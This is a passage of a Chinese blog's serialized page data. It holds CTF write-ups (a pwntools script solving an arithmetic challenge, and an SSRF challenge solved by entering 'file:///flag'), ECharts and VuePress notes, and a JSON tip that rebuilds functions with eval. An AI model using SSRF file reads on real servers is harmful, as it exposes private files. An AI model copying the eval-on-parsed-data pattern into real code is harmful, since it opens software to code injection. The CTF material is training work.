io.recvuntil(b'What is ')\n    # 再次调用recvuntil函数从远程服务器接收数据，等待接收下一个题目开始的提示内容（直到再次接收到b'What is '为止），\n    # 为下一轮循环中接收和处理下一个运算题目做准备\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n",normalizedContent:"[litctf 2023]这套题是web方向入门题单，这是我的第26题\n\n\n\n * 题目描述：来点小学生喜欢的x 不会算错吧？\n * 考点：python脚本\n * 预期解：用python编写脚本\n\n\n\n * 题单【传送门】\n\n题目编号   题目名称   题目方向   难度\n3876   口算题卡   web    1\n\n\n# 题目26：口算题卡\n\n\n# 题目描述：来点小学生喜欢的x 不会算错吧？\n\n\n# 考点：python脚本\n\n\n# 预期解：用python编写脚本\n\n进入页面后，页面提示\n\n\n __           ________      _________   ______       _________   ______    \n/_/\\         /_______/\\    /________/\\ /_____/\\     /________/\\ /_____/\\   \n\\:\\ \\        \\__.::._\\/    \\__.::.__\\/ \\:::__\\/     \\__.::.__\\/ \\::::_\\/_  \n \\:\\ \\          \\::\\ \\        \\::\\ \\    \\:\\ \\  __      \\::\\ \\    \\:\\/___/\\ \n  \\:\\ \\____     _\\::\\ \\__      \\::\\ \\    \\:\\ \\/_/\\      \\::\\ \\    \\:::._\\/ \n   \\:\\/___/\\   /__\\::\\__/\\      \\::\\ \\    \\:\\_\\ \\ \\      \\::\\ \\    \\:\\ \\   \n    \\_____\\___________________   \\__\\_____ \\_____\\______  \\__\\/     \\_\\/   \n          /_____/\\     /_____/\\     /_____/\\     /_____/\\                  \n          \\:::_:\\ \\    \\:::_ \\ \\    \\:::_:\\ \\    \\:::_:\\ \\                 \n              _\\:\\|     \\:\\ \\ \\ \\       _\\:\\|       /_\\:\\ \\                \n _______     /::_/__     \\:\\ \\ \\ \\     /::_/__      \\::_:\\ \\               \n/______/\\    \\:\\____/\\    \\:\\_\\ \\ \\    \\:\\____/\\    /___\\:\\ '              \n\\__::::\\/     \\_____\\/     \\_____\\/     \\_____\\/    \\______/               \n                                                                           \nwelcome to the litctf2023 verbal problem card!\nyou will be presented with 100 addition and subtraction problems.\nyour goal is to answer all of them correctly to get the flag!\nif you wrong, you will be kicked out of the game.\ngood luck & have fun!\nwhat is 86 - 32?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n看了别人的题解，用的是python写了脚本\n\nfrom pwn import *\n# 从pwn库中导入所有内容，pwn库常用于编写漏洞利用相关脚本，提供了如与远程服务器交互、构造payload等功能\n\nio = remote('node4.anna.nssctf.cn', 28659)\n# 使用remote函数创建一个网络连接，连接到指定的远程主机（node4.anna.nssctf.cn）的指定端口（28659），\n# 后续通过io对象来和远程服务器进行数据的发送与接收操作\n\ncontext(arch='amd64', log_level='debug')\n# 通过context函数设置当前脚本执行的上下文环境，这里将架构设置为amd64，意味着后续相关操作按照64位体系结构处理，\n# 同时将日志级别设置为debug，会输出详细的调试信息，方便排查问题和查看交互情况\n\nio.recvuntil(b'what is ')\n# 通过io连接对象调用recvuntil函数，从远程服务器接收数据，直到遇到字节串b'what is '为止，\n# 目的是获取包含题目提示起始部分的完整内容\n\nfor i in range(100):\n    # 开始一个循环，循环100次，通常用于处理100轮类似的交互任务，比如连续回答100个题目，不过这里暂时没用到循环变量i的取值\n    line = io.recvuntil('?')\n    # 在每次循环中，继续从远程服务器接收数据，接收截止到遇到字符'?'为止，获取完整的包含具体运算题目的那一行内容，\n    # 并将接收到的数据赋值给变量line\n    if b'+' in line:\n        # 判断接收到的字节串line中是否包含字节串b'+'，如果包含则说明是加法运算题目，进入该分支进行加法相关处理\n        a = int(line[0:line.find(b'+')].strip(b' '))\n        # 提取加法运算的第一个操作数：\n        # 先通过line.find(b'+')找到字节串中b'+'的位置索引，然后截取从开头到b'+'之前的字节串部分，\n        # 再去除前后空格，最后将其转换为整数赋值给变量a\n        b = int(line[line.find(b'+') + 1:].strip(b'?').strip(b' '))\n        # 提取加法运算的第二个操作数：\n        # 截取从b'+'后面一位开始到字节串末尾的部分，先去除末尾的'?'字符（因为recvuntil接收到'?'截止），\n        # 再去除前后空格，最后转换为整数赋值给变量b\n        payload = a + b\n        # 将两个操作数相加，把相加的结果赋值给变量payload，这个payload就是加法运算题目的答案，后续要发送给服务器\n    else:\n        # 如果字节串line中不包含b'+'，则进入该else分支，意味着是减法运算题目，进行减法相关处理\n        a = int(line[0:line.find(b'-')].strip(b' '))\n        # 提取减法运算的被减数：\n        # 原理和加法中提取第一个操作数类似，通过line.find(b'-')找到b'-'的位置，截取开头到b'-'之前的字节串部分，\n        # 去除空格后转换为整数赋值给a\n        b = int(line[line.find(b'-') + 1:].strip(b'?').strip(b' '))\n        # 提取减法运算的减数：\n        # 截取b'-'后面的字节串部分，经过去除末尾的'?'以及前后空格等处理后，转换为整数赋值给变量b\n        payload = a - b\n        # 计算两数相减的结果，并将结果赋值给payload，这个payload就是减法运算题目的答案，后续要发送给服务器\n    io.send(str(payload))\n    # 将计算得到的答案（存放在payload变量中）转换为字符串（因为网络发送文本数据需要字符串类型），\n    # 然后通过io连接对象的send函数将答案发送给远程服务器，完成对当前运算题目的回复操作\n    io.recvuntil(b'what is ')\n    # 再次调用recvuntil函数从远程服务器接收数据，等待接收下一个题目开始的提示内容（直到再次接收到b'what is '为止），\n    # 为下一轮循环中接收和处理下一个运算题目做准备\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n",charsets:{cjk:!0},lastUpdated:"2024/12/04, 20:35:26",lastUpdatedTimestamp:1733315726e3},{title:"NSSCTF-Web方向题目-WriteUP-NSSCTF-5604",frontmatter:{title:"NSSCTF-Web方向题目-WriteUP-NSSCTF-5604",date:"2024-12-04T00:00:00.000Z",tags:["CTF","NSSCTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-12-04-1-CTF-5604-WriteUp.html",relativePath:"views/essay/2024-12-04-1-CTF-5604-WriteUp.md",key:"v-2f67e018",path:"/views/essay/2024-12-04-1-CTF-5604-WriteUp.html",headers:[{level:3,title:"题目描述：浏览器里套浏览器再套浏览器！",slug:"题目描述-浏览器里套浏览器再套浏览器",normalizedTitle:"题目描述：浏览器里套浏览器再套浏览器！",charIndex:42},{level:3,title:"考点：SSRF服务器端请求伪造",slug:"考点-ssrf服务器端请求伪造",normalizedTitle:"考点：ssrf服务器端请求伪造",charIndex:65},{level:3,title:"预期解：用伪协议查看服务器文件内容",slug:"预期解-用伪协议查看服务器文件内容",normalizedTitle:"预期解：用伪协议查看服务器文件内容",charIndex:84}],excerpt:'<Boxx/>\n<p>[LitCTF 2024]这套题是Web方向入门题单，这是我的第27题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://www.nssctf.cn/problem/3861" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>5604</td>\n<td>浏览器也能套娃？</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述：浏览器里套浏览器再套浏览器！ 考点：SSRF服务器端请求伪造 预期解：用伪协议查看服务器文件内容",content:"[LitCTF 2024]这套题是Web方向入门题单，这是我的第27题\n\n\n\n * 题目描述：浏览器里套浏览器再套浏览器！\n * 考点：SSRF服务器端请求伪造\n * 预期解：用伪协议查看服务器文件内容\n\n\n\n * 题单【传送门】\n\n题目编号   题目名称       题目方向   难度\n5604   浏览器也能套娃？   Web    1\n\n\n# 题目27：浏览器也能套娃？\n\n\n# 题目描述：浏览器里套浏览器再套浏览器！\n\n\n# 考点：SSRF服务器端请求伪造\n\n\n# 预期解：用伪协议查看服务器文件内容\n\n进入页面后，发现是在页面里显示了一个浏览器，如下图\n\n\n\n这道题需要对SSRF伪协议有一个基本的了解，掌握基本的用法\n\n> SSRF（服务器端请求伪造，Server-Side Request Forgery）:\n> \n> 定义：是一种网络安全攻击，攻击者可以通过服务器发起未经授权的请求，目的是利用服务器向其他网络或服务器发送恶意请求。简单来说，就是攻击者诱导服务器去访问本来不应该访问的资源或地址。\n> \n> 作用：允许浏览器或应用访问本地计算机中的文件，而不是通过网络访问资源。\n> \n> 示例：file:///C:/Users/YourName/Documents/file.txt，这个伪协议会让浏览器直接显示本地硬盘中的文件。\n> \n> 通俗理解：这是让浏览器去你的电脑里找东西，而不是去互联网中找文件。\n\n超级简单题，地址栏输入以下内容，即可访问文件\n\nfile:///flag\n\n\n1\n\n\n",normalizedContent:"[litctf 2024]这套题是web方向入门题单，这是我的第27题\n\n\n\n * 题目描述：浏览器里套浏览器再套浏览器！\n * 考点：ssrf服务器端请求伪造\n * 预期解：用伪协议查看服务器文件内容\n\n\n\n * 题单【传送门】\n\n题目编号   题目名称       题目方向   难度\n5604   浏览器也能套娃？   web    1\n\n\n# 题目27：浏览器也能套娃？\n\n\n# 题目描述：浏览器里套浏览器再套浏览器！\n\n\n# 考点：ssrf服务器端请求伪造\n\n\n# 预期解：用伪协议查看服务器文件内容\n\n进入页面后，发现是在页面里显示了一个浏览器，如下图\n\n\n\n这道题需要对ssrf伪协议有一个基本的了解，掌握基本的用法\n\n> ssrf（服务器端请求伪造，server-side request forgery）:\n> \n> 定义：是一种网络安全攻击，攻击者可以通过服务器发起未经授权的请求，目的是利用服务器向其他网络或服务器发送恶意请求。简单来说，就是攻击者诱导服务器去访问本来不应该访问的资源或地址。\n> \n> 作用：允许浏览器或应用访问本地计算机中的文件，而不是通过网络访问资源。\n> \n> 示例：file:///c:/users/yourname/documents/file.txt，这个伪协议会让浏览器直接显示本地硬盘中的文件。\n> \n> 通俗理解：这是让浏览器去你的电脑里找东西，而不是去互联网中找文件。\n\n超级简单题，地址栏输入以下内容，即可访问文件\n\nfile:///flag\n\n\n1\n\n\n",charsets:{cjk:!0},lastUpdated:"2024/12/04, 20:35:26",lastUpdatedTimestamp:1733315726e3},{title:"ECharts常用图表",frontmatter:{title:"ECharts常用图表",date:"2019-08-03T17:37:25.000Z",tags:["ECharts"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/EChartsStudy.html",relativePath:"views/frontend/EChartsStudy.md",key:"v-109400ee",path:"/views/frontend/EChartsStudy.html",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:3},{level:2,title:"常用网址",slug:"常用网址",normalizedTitle:"常用网址",charIndex:9},{level:2,title:"图表展示如下",slug:"图表展示如下",normalizedTitle:"图表展示如下",charIndex:17},{level:2,title:"使用服务端返回数据的异步加载和更新",slug:"使用服务端返回数据的异步加载和更新",normalizedTitle:"使用服务端返回数据的异步加载和更新",charIndex:27}],headersStr:"介绍 常用网址 图表展示如下 使用服务端返回数据的异步加载和更新",content:" * 介绍\n * 常用网址\n * 图表展示如下\n * 使用服务端返回数据的异步加载和更新\n\n\n\n\n# 介绍\n\n 1. 把常用的ECharts图表整理一下，方便日后的使用\n\n 2. 图表实例可见：http://zpj80231.gitee.io/echartsstudy/\n\n\n# 常用网址\n\n * 在ECharts官网运行编辑实例：\n   \n   * https://www.echartsjs.com/gallery/editor.html?c=doc-example/getting-started\n\n * EChartsoption中各参数详细配置项：\n   \n   * https://echarts.baidu.com/option.html#grid\n\n\n# 图表展示如下\n\n * 柱+折线图\n\n\n\n * 饼图\n\n\n\n * 迁徙图\n\n\n\n * 接入百度地图\n\n\n\n\n# 使用服务端返回数据的异步加载和更新\n\n详见官网：异步数据加载和更新\n\nfunction method(init的char,option参数,查询条件1,查询条件2,查询条件3){\n\t//ECharts 默认有提供了一个简单的加载动画。只需要调用 showLoading 方法显示。数据加载完成后再调用 hideLoading 方法隐藏加载动画。\n    chart.showLoading({\n\t\ttext: '加载中...'\n\t});\n    \n\t$.ajax({\n\t\ttype:\"POST\",\n\t\tdata:{\"查询条件1\":查询条件1,'查询条件2':查询条件2,'查询条件3':查询条件3},\n        url:\"/zhidinglianjie\",\n        success:function(data){\n           if(data){\n               \t/*注意填入数据的格式：\n               \tseries: [{\n                    // 根据名字对应到相应的系列\n                    name: '销量',\n                    data: [53, 25, 26, 20, 32, 25]\n        \t\t}]*/\n\t\t\t\toption.series[0].data =  data.data\n\t\t\t\toption.series[1].data = data.categories\n\t\t\t\tchart.setOption(option);\n           }else{\n                \n           }\n            //数据加载完成后再调用 hideLoading 方法隐藏加载动画。\n\t\t\tchart.hideLoading();\n        },\n        error:function(jqXHR){\n\t\t\tchart.hideLoading();\n        }\n\t});\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n",normalizedContent:" * 介绍\n * 常用网址\n * 图表展示如下\n * 使用服务端返回数据的异步加载和更新\n\n\n\n\n# 介绍\n\n 1. 把常用的echarts图表整理一下，方便日后的使用\n\n 2. 图表实例可见：http://zpj80231.gitee.io/echartsstudy/\n\n\n# 常用网址\n\n * 在echarts官网运行编辑实例：\n   \n   * https://www.echartsjs.com/gallery/editor.html?c=doc-example/getting-started\n\n * echartsoption中各参数详细配置项：\n   \n   * https://echarts.baidu.com/option.html#grid\n\n\n# 图表展示如下\n\n * 柱+折线图\n\n\n\n * 饼图\n\n\n\n * 迁徙图\n\n\n\n * 接入百度地图\n\n\n\n\n# 使用服务端返回数据的异步加载和更新\n\n详见官网：异步数据加载和更新\n\nfunction method(init的char,option参数,查询条件1,查询条件2,查询条件3){\n\t//echarts 默认有提供了一个简单的加载动画。只需要调用 showloading 方法显示。数据加载完成后再调用 hideloading 方法隐藏加载动画。\n    chart.showloading({\n\t\ttext: '加载中...'\n\t});\n    \n\t$.ajax({\n\t\ttype:\"post\",\n\t\tdata:{\"查询条件1\":查询条件1,'查询条件2':查询条件2,'查询条件3':查询条件3},\n        url:\"/zhidinglianjie\",\n        success:function(data){\n           if(data){\n               \t/*注意填入数据的格式：\n               \tseries: [{\n                    // 根据名字对应到相应的系列\n                    name: '销量',\n                    data: [53, 25, 26, 20, 32, 25]\n        \t\t}]*/\n\t\t\t\toption.series[0].data =  data.data\n\t\t\t\toption.series[1].data = data.categories\n\t\t\t\tchart.setoption(option);\n           }else{\n                \n           }\n            //数据加载完成后再调用 hideloading 方法隐藏加载动画。\n\t\t\tchart.hideloading();\n        },\n        error:function(jqxhr){\n\t\t\tchart.hideloading();\n        }\n\t});\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"vuepress-theme-reco主题开发",frontmatter:{title:"vuepress-theme-reco主题开发",date:"2019-11-14T16:41:12.000Z",sidebar:!0,sidebarDepth:5,tags:["vuepress"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/reco-info.html",relativePath:"views/frontend/reco-info.md",key:"v-5626603a",path:"/views/frontend/reco-info.html",headers:[{level:2,title:"序言",slug:"序言",normalizedTitle:"序言",charIndex:3},{level:2,title:"本地环境搭建",slug:"本地环境搭建",normalizedTitle:"本地环境搭建",charIndex:9},{level:3,title:"1. 去 theme-example ，找个合心意的博客 clone",slug:"_1-去-theme-example-找个合心意的博客-clone",normalizedTitle:"1. 去 theme-example ，找个合心意的博客 clone",charIndex:21},{level:3,title:"2. 把项目下载之后，修改 package.json",slug:"_2-把项目下载之后-修改-package-json",normalizedTitle:"2. 把项目下载之后，修改 package.json",charIndex:61},{level:3,title:"3. 更换主题为本地",slug:"_3-更换主题为本地",normalizedTitle:"3. 更换主题为本地",charIndex:93},{level:2,title:"可能遇到的问题",slug:"可能遇到的问题",normalizedTitle:"可能遇到的问题",charIndex:107},{level:3,title:"1. 插件解析失败问题",slug:"_1-插件解析失败问题",normalizedTitle:"1. 插件解析失败问题",charIndex:120}],headersStr:"序言 本地环境搭建 1. 去 theme-example ，找个合心意的博客 clone 2. 把项目下载之后，修改 package.json 3. 更换主题为本地 可能遇到的问题 1. 插件解析失败问题",content:' * 序言\n * 本地环境搭建\n   * 1. 去 theme-example ，找个合心意的博客 clone\n   * 2. 把项目下载之后，修改 package.json\n   * 3. 更换主题为本地\n * 可能遇到的问题\n   * 1. 插件解析失败问题\n\n\n\n\n# 序言\n\n如果你开始或已经使用 vuepress-theme-reco 搭建了属于自己的个人博客的时候，那么恭喜你，你已经成为我们的一员了。 那么我想以下一定是需要了解的：\n\n * vuepress官网：https://vuepress.vuejs.org/zh/\n * vuepress自定义开发主题：https://vuepress.vuejs.org/zh/theme/writing-a-theme.html\n * vuepress-theme-reco官网：https://vuepress-theme-reco.recoluan.com/\n\n\n# 本地环境搭建\n\n\n# 1. 去 theme-example ，找个合心意的博客 clone\n\n * 我就以我的下载我的为例：git clone https://github.com/zpj80231.git\n\n\n# 2. 把项目下载之后，修改 package.json\n\n{\n    "scripts": {\n        "docs:dev": "vuepress dev docs",\n        "docs:build": "vuepress build docs",\n        "deploy": "bash deploy.sh"\n    },\n    "devDependencies": {\n        "vuepress": "^1.2.0",\n        "vuepress-theme-reco": "^1.1.2-alpha.2"        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n * 然后在此目录下打开命令窗口执行：npm install（提前安装好node.js环境）\n\n\n# 3. 更换主题为本地\n\n * 打开git，克隆：git clone https://github.com/vuepress-reco/vuepress-theme-reco.git\n   \n   把下载下来的文件夹更名为 theme，粘贴至 .vuepress下即可。\n\n * 将主题文件放到本地开发环境\n\n##复制node_modules/vuepress-theme-reco 文件夹\n##粘贴至.vuepress/ 下并更名为theme\nDev\n├─── docs\n│   └── .vuepress   // 配置目录\n│   │    ├── public // 静态资源\n│   │    ├── theme // 主题\n│   │    │   ├── components // 组件\n│   │    │   ├── global-components // 全局组件\n│   │    │   ├── layouts // 布局(包括首页在内)\n│   │    │   ├── styles // 样式\n│   │    │   ├── util // 工具\n│   │    │   ├── index.js // 入口配置\n│   │    │   ├── noopModule.js // 依赖注入\n│   │    │   ├── package.json // 主题依赖\n│   │    │   ├── README.md // 主题说明\n│   │    └── config.js\n│   ├── FAQ     // 求索模块\n│   ├── Store   // 仓库模块\n│   ├── Thought // 随笔模块\n│   └── README.md   // 博客首页\n└── package.json\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n * 运行预览\n   \n   执行命令：vuepress dev docs\n   \n   当看到控制台输出：tip Apply theme located at ... 并正常启动，则表示本地环境搭建成功。\n   \n   在浏览器地址输入：http://localhost:8080即可看到界面：\n   \n   \n\n * 如果想直接使用 .html文件的话将 .html文件放在 .vuepress/public 目录下即可（需自己配置引用路径）。\n\n\n# 可能遇到的问题\n\n\n# 1. 插件解析失败问题\n\n> 有这几个解决办法，就是无法解析node_modules依赖关系\n\n * 根目录下安装一下vuepress-theme-reco这个依赖\n * 最直接的就是在主题目录执行一下npm install\n * 或许你删除node_modules，重新安装一下依赖也有可能解决\n * 如以上三步都不行的话，以这个命令npm run docs:dev启动项目，或者联系我',normalizedContent:' * 序言\n * 本地环境搭建\n   * 1. 去 theme-example ，找个合心意的博客 clone\n   * 2. 把项目下载之后，修改 package.json\n   * 3. 更换主题为本地\n * 可能遇到的问题\n   * 1. 插件解析失败问题\n\n\n\n\n# 序言\n\n如果你开始或已经使用 vuepress-theme-reco 搭建了属于自己的个人博客的时候，那么恭喜你，你已经成为我们的一员了。 那么我想以下一定是需要了解的：\n\n * vuepress官网：https://vuepress.vuejs.org/zh/\n * vuepress自定义开发主题：https://vuepress.vuejs.org/zh/theme/writing-a-theme.html\n * vuepress-theme-reco官网：https://vuepress-theme-reco.recoluan.com/\n\n\n# 本地环境搭建\n\n\n# 1. 去 theme-example ，找个合心意的博客 clone\n\n * 我就以我的下载我的为例：git clone https://github.com/zpj80231.git\n\n\n# 2. 把项目下载之后，修改 package.json\n\n{\n    "scripts": {\n        "docs:dev": "vuepress dev docs",\n        "docs:build": "vuepress build docs",\n        "deploy": "bash deploy.sh"\n    },\n    "devdependencies": {\n        "vuepress": "^1.2.0",\n        "vuepress-theme-reco": "^1.1.2-alpha.2"        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n * 然后在此目录下打开命令窗口执行：npm install（提前安装好node.js环境）\n\n\n# 3. 更换主题为本地\n\n * 打开git，克隆：git clone https://github.com/vuepress-reco/vuepress-theme-reco.git\n   \n   把下载下来的文件夹更名为 theme，粘贴至 .vuepress下即可。\n\n * 将主题文件放到本地开发环境\n\n##复制node_modules/vuepress-theme-reco 文件夹\n##粘贴至.vuepress/ 下并更名为theme\ndev\n├─── docs\n│   └── .vuepress   // 配置目录\n│   │    ├── public // 静态资源\n│   │    ├── theme // 主题\n│   │    │   ├── components // 组件\n│   │    │   ├── global-components // 全局组件\n│   │    │   ├── layouts // 布局(包括首页在内)\n│   │    │   ├── styles // 样式\n│   │    │   ├── util // 工具\n│   │    │   ├── index.js // 入口配置\n│   │    │   ├── noopmodule.js // 依赖注入\n│   │    │   ├── package.json // 主题依赖\n│   │    │   ├── readme.md // 主题说明\n│   │    └── config.js\n│   ├── faq     // 求索模块\n│   ├── store   // 仓库模块\n│   ├── thought // 随笔模块\n│   └── readme.md   // 博客首页\n└── package.json\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n * 运行预览\n   \n   执行命令：vuepress dev docs\n   \n   当看到控制台输出：tip apply theme located at ... 并正常启动，则表示本地环境搭建成功。\n   \n   在浏览器地址输入：http://localhost:8080即可看到界面：\n   \n   \n\n * 如果想直接使用 .html文件的话将 .html文件放在 .vuepress/public 目录下即可（需自己配置引用路径）。\n\n\n# 可能遇到的问题\n\n\n# 1. 插件解析失败问题\n\n> 有这几个解决办法，就是无法解析node_modules依赖关系\n\n * 根目录下安装一下vuepress-theme-reco这个依赖\n * 最直接的就是在主题目录执行一下npm install\n * 或许你删除node_modules，重新安装一下依赖也有可能解决\n * 如以上三步都不行的话，以这个命令npm run docs:dev启动项目，或者联系我',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"JavaScript中JSON对象和串的互转",frontmatter:{title:"JavaScript中JSON对象和串的互转",date:"2019-03-23T00:00:00.000Z",tags:["JavaScript","json"],categories:["前端 Front-end"],isShowComments:!1},regularPath:"/views/frontend/js-json.html",relativePath:"views/frontend/js-json.md",key:"v-4e21f9cc",path:"/views/frontend/js-json.html",headers:[{level:2,title:"JavaScript中的JSON",slug:"javascript中的json",normalizedTitle:"javascript中的json",charIndex:3},{level:2,title:"JSON互转的第二种用法",slug:"json互转的第二种用法",normalizedTitle:"json互转的第二种用法",charIndex:23},{level:2,title:"写给自己的js规范",slug:"写给自己的js规范",normalizedTitle:"写给自己的js规范",charIndex:39},{level:4,title:"在js中书写代码给自己定的规范：（或者objet转string之前）",slug:"在js中书写代码给自己定的规范-或者objet转string之前",normalizedTitle:"在js中书写代码给自己定的规范：（或者objet转string之前）",charIndex:1444},{level:4,title:"在js中书写代码给自己定的规范：（或者string转object之前）",slug:"在js中书写代码给自己定的规范-或者string转object之前",normalizedTitle:"在js中书写代码给自己定的规范：（或者string转object之前）",charIndex:1618},{level:2,title:"其它",slug:"其它",normalizedTitle:"其它",charIndex:52}],headersStr:"JavaScript中的JSON JSON互转的第二种用法 写给自己的js规范 在js中书写代码给自己定的规范：（或者objet转string之前） 在js中书写代码给自己定的规范：（或者string转object之前） 其它",content:' * JavaScript中的JSON\n * JSON互转的第二种用法\n * 写给自己的js规范\n * 其它\n\n\n\n\n# JavaScript中的JSON\n\n> 在实际工作中，我么最常用的就是简单的 JSON.parse(str) 和 JSON.stringify (obj) 做JSON对象和字符串之间的相互转换\n\n * JSON.parse(string) ：接受一个 JSON 字符串并将其转换成一个 JavaScript 对象\n * JSON.stringify(obj) ：接受一个 JavaScript 对象并将其转换为一个 JSON 字符串\n\n> 上面那种JSON.parse(string)用法只能转普通对象，当对象中有function事件的时候会自动过滤掉。如下：\n\nvar json={\n  name:\'json\',\n  getName:function(){\n     return this.name;   \n  }\n}\n\nconsole.log(JSON.stringify(json));\n//"{"name":"json"}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n * 这就坑了，因为需要，必须要得把function也转了才行，怎么办呢？其实大家都没注意到 JSON.stringify还有些参数\n\n\n# JSON互转的第二种用法\n\n * 从Object转为String\n\n  var json={\n    name:\'json\',\n    getName:function(){\n       return this.name;   \n    }\n  }\n  \n  var s=JSON.stringify(json, function(key, val) {\n    if (typeof val === \'function\') {\n      return val + \'\';\n    }\n    return val;\n  });\n  \n  console.log(s);\n  //"{"name":"json","getName":"function (){\\n     return this.name;   \\n  }"}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n注意转换完成之后记得把 \\n 全部删掉，不然从string再转为object的时候会报错，没错，就是这么坑。\n\n不信的话可以去这么网址试一下：传送们\n\n * 从String转为Object\n\nvar s=`{"name":"json","getName":"function (){     return this.name;     }"}`;\n\nvar o = JSON.parse(s,function(k,v){\n  if(v.indexOf&&v.indexOf(\'function\')>-1){\n     return eval("(function(){return "+v+" })()")\n  }\n  return v;\n});\n\nconsole.log(o);//就是原对象啦\n//{ name: "json", getName: function (){     return this.name;     } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 写给自己的js规范\n\n# 在js中书写代码给自己定的规范：（或者objet转string之前）\n\n 1. 在js中能用的话 一定要用单引号\n 2. 在使用 if(){}else{} 的时候，一定不要省略大括号\n 3. js中一段代码结束后一定要加 ;（虽然在js中不加不会报错，把对象转为串的时候也不会报错，但是json从串转为对象的时候就会报错了，亲身经历啊！！）\n\n# 在js中书写代码给自己定的规范：（或者string转object之前）\n\n 1. 把所有的 \\r\\n 删掉\n 2. 把所有的 \\t 删掉\n 3. 把所有的 function 中的注释都删掉\n 4. 注意有没有代码不规范的地方（如上规范）\n\n\n# 其它\n\n * JSON转换简单使用\n * JSON转换的第二个参数\n * 在线写js尝试JSON转换',normalizedContent:' * javascript中的json\n * json互转的第二种用法\n * 写给自己的js规范\n * 其它\n\n\n\n\n# javascript中的json\n\n> 在实际工作中，我么最常用的就是简单的 json.parse(str) 和 json.stringify (obj) 做json对象和字符串之间的相互转换\n\n * json.parse(string) ：接受一个 json 字符串并将其转换成一个 javascript 对象\n * json.stringify(obj) ：接受一个 javascript 对象并将其转换为一个 json 字符串\n\n> 上面那种json.parse(string)用法只能转普通对象，当对象中有function事件的时候会自动过滤掉。如下：\n\nvar json={\n  name:\'json\',\n  getname:function(){\n     return this.name;   \n  }\n}\n\nconsole.log(json.stringify(json));\n//"{"name":"json"}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n * 这就坑了，因为需要，必须要得把function也转了才行，怎么办呢？其实大家都没注意到 json.stringify还有些参数\n\n\n# json互转的第二种用法\n\n * 从object转为string\n\n  var json={\n    name:\'json\',\n    getname:function(){\n       return this.name;   \n    }\n  }\n  \n  var s=json.stringify(json, function(key, val) {\n    if (typeof val === \'function\') {\n      return val + \'\';\n    }\n    return val;\n  });\n  \n  console.log(s);\n  //"{"name":"json","getname":"function (){\\n     return this.name;   \\n  }"}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n注意转换完成之后记得把 \\n 全部删掉，不然从string再转为object的时候会报错，没错，就是这么坑。\n\n不信的话可以去这么网址试一下：传送们\n\n * 从string转为object\n\nvar s=`{"name":"json","getname":"function (){     return this.name;     }"}`;\n\nvar o = json.parse(s,function(k,v){\n  if(v.indexof&&v.indexof(\'function\')>-1){\n     return eval("(function(){return "+v+" })()")\n  }\n  return v;\n});\n\nconsole.log(o);//就是原对象啦\n//{ name: "json", getname: function (){     return this.name;     } }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 写给自己的js规范\n\n# 在js中书写代码给自己定的规范：（或者objet转string之前）\n\n 1. 在js中能用的话 一定要用单引号\n 2. 在使用 if(){}else{} 的时候，一定不要省略大括号\n 3. js中一段代码结束后一定要加 ;（虽然在js中不加不会报错，把对象转为串的时候也不会报错，但是json从串转为对象的时候就会报错了，亲身经历啊！！）\n\n# 在js中书写代码给自己定的规范：（或者string转object之前）\n\n 1. 把所有的 \\r\\n 删掉\n 2. 把所有的 \\t 删掉\n 3. 把所有的 function 中的注释都删掉\n 4. 注意有没有代码不规范的地方（如上规范）\n\n\n# 其它\n\n * json转换简单使用\n * json转换的第二个参数\n * 在线写js尝试json转换',charsets:{cjk:!0},lastUpdated:"2024/11/15, 